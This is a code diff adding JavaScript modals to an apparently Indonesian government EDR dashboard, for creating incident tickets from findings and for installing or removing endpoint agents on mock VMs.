+                <button onclick="edrCreateINC('${findingId}')" class="flex items-center gap-1.5 text-[9px] font-extrabold text-white bg-rose-600 hover:bg-rose-700 px-5 py-2 rounded-xl transition-colors shadow-sm shadow-rose-200">
+                    <i class="fas fa-ticket-alt text-[8px]"></i>Buat INC
+                </button>
+            </div>`);
+    }
+
+    function edrCreateINC(findingId) {
+        const title = document.getElementById('edr-inc-title')?.value.trim();
+        const priority = document.getElementById('edr-inc-priority')?.value;
+        const desc    = document.getElementById('edr-inc-desc')?.value.trim();
+        if (!title) { alert('Judul insiden wajib diisi.'); return; }
+
+        // Find agent and update malicious_log
+        const incNo = 'INC-' + edrNextIncNo++;
+        let updated = false;
+        (mockData.edr || []).forEach(agent => {
+            (agent.malicious_log || []).forEach(f => {
+                if (f.id === findingId) {
+                    f.inc_no  = incNo;
+                    f.inc_ket = title;
+                    updated   = true;
+                }
+            });
+        });
+        if (!updated) return;
+
+        edrCloseModal();
+        edrRenderAll();
+        frmToast(`Insiden ${incNo} berhasil dibuat dan dilampirkan ke temuan EDR.`, 'rose');
+    }
+
+    // ── Install agent modal ──
+    function edrShowInstallModal() {
+        edrShowModal(`
+            <div class="p-5 border-b border-slate-100 flex items-center justify-between">
+                <h3 class="text-sm font-extrabold text-slate-800">Pasang Agen EDR</h3>
+                <button onclick="edrCloseModal()" class="text-slate-400 hover:text-slate-600 text-lg"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="p-5 space-y-4">
+                <div>
+                    <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Nama VM <span class="text-rose-400">*</span></label>
+                    <input id="edr-inst-vm" type="text" placeholder="vm-skpd-aplikasi-01"
+                        class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-300">
+                </div>
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">SKPD</label>
+                        <select id="edr-inst-skpd" class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-300 bg-white">
+                            ${['Dinas Kesehatan','Bappeda','Diskominfo','BPBD','BPKAD','Dishub','Dinsos','Dinas Pendidikan'].map(s=>`<option>${s}</option>`).join('')}
+                        </select>
+                    </div>
+                    <div>
+                        <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Sistem Operasi</label>
+                        <select id="edr-inst-os" class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-300 bg-white">
+                            ${['Ubuntu 22.04 LTS','Ubuntu 20.04 LTS','Debian 12','CentOS 7.9','Rocky Linux 9','Windows Server 2022'].map(o=>`<option>${o}</option>`).join('')}
+                        </select>
+                    </div>
+                </div>
+                <div>
+                    <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Policy Keamanan</label>
+                    <select id="edr-inst-policy" class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-300 bg-white">
+                        ${['Production Server','Database Tier','Web Tier','Mail Server','Financial Tier','Default'].map(p=>`<option>${p}</option>`).join('')}
+                    </select>
+                </div>
+                <div class="bg-blue-50 border border-blue-100 rounded-xl p-3">
+                    <p class="text-[8px] font-extrabold text-blue-700 mb-1"><i class="fas fa-info-circle mr-1"></i>Informasi Instalasi</p>
+                    <p class="text-[8px] text-slate-600">Agen akan dipasang dalam mode lisensi trial selama 30 hari. Pastikan VM memiliki akses internet ke endpoint EDR Management Server (edr-mgmt.jabarprov.go.id:443).</p>
+                </div>
+            </div>
+            <div class="px-5 pb-5 flex gap-2 justify-end border-t border-slate-100 pt-4">
+                <button onclick="edrCloseModal()" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 hover:bg-slate-200 px-4 py-2 rounded-xl transition-colors">Batal</button>
+                <button onclick="edrInstallAgent()" class="flex items-center gap-1.5 text-[9px] font-extrabold text-white bg-rose-600 hover:bg-rose-700 px-5 py-2 rounded-xl transition-colors">
+                    <i class="fas fa-plus text-[8px]"></i>Pasang Agen
+                </button>
+            </div>`);
+    }
+
+    function edrInstallAgent() {
+        const vm     = document.getElementById('edr-inst-vm')?.value.trim();
+        const skpd   = document.getElementById('edr-inst-skpd')?.value;
+        const os     = document.getElementById('edr-inst-os')?.value;
+        const policy = document.getElementById('edr-inst-policy')?.value;
+        if (!vm) { alert('Nama VM wajib diisi.'); return; }
+        const now = new Date().toLocaleDateString('id-ID',{day:'2-digit',month:'short',year:'numeric'}) + ', ' + new Date().toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+        mockData.edr.push({ id: Date.now(), vm, skpd, os, edr_status:'licensed', version:'7.5.1', policy, last_sync:now, last_scan:now, threats:0, quarantined:0, malicious_log:[] });
+        edrCloseModal(); edrRenderAll();
+        frmToast(`Agen EDR berhasil dipasang pada ${vm}.`, 'rose');
+    }
+
+    function edrRemoveAgent(id) {
+        const a = (mockData.edr || []).find(x => x.id === id);
+        if (!a) return;
+        if (!confirm(`Lepas agen EDR dari ${a.vm}? Data temuan akan tetap tersimpan.`)) return;
+        a.edr_status = 'none'; a.version = '-'; a.policy = '-'; a.last_sync = '-'; a.last_scan = '-';
+        edrRenderAll();
+        frmToast(`Agen EDR berhasil dilepas dari ${a.vm}.`, 'amber');
+    }
+
+    // ── Modal helpers ──
+    function edrShowModal(html) {
+        const ov  = document.getElementById('edr-modal-ov');
+        const box = document.getElementById('edr-modal-box');
+        if (!ov || !box) return;
+        box.innerHTML = html;
+        box.style.transform = 'scale(.95)'; box.style.opacity = '0';
+        ov.style.display = 'flex';
+        setTimeout(() => { box.style.transform = 'scale(1)'; box.style.opacity = '1'; }, 10);
+    }
+
+    function edrCloseModal() {
+        const ov  = document.getElementById('edr-modal-ov');
+        const box = document.getElementById('edr-modal-box');
+        if (box) { box.style.transform = 'scale(.95)'; box.style.opacity = '0'; }
         setTimeout(() => { if (ov) ov.style.display = 'none'; }, 200);
     }
 
